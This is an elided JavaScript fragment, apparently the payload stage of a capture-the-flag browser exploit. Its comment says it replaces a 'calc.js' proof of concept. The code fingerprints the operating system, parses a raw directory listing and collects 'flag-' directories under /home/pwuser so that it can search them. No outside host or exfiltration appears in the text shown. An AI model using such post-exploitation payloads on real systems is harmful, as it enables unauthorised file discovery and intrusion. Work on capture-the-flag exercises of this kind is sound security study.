// Flag path discovery - replaces calc.js
...
if (FINGERPRINT.platform.os === "Linux") {
    try {
        ...
        log(`[+] Directory listing: ${bytes_read} bytes`, 0);

        let output = "FLAG DIRECTORIES:\n\n";
        let offset = 0;
        let flag_dirs = [];
        ...
        while (offset < bytes_read) {
            ...
            if (dtype === 4 && name.startsWith("flag-")) {
                flag_dirs.push("/home/pwuser/" + name);
                output += "Found: " + name + "\n";
            }
        ...
        // Search inside flag directories
        for (let flag_dir of flag_dirs) {
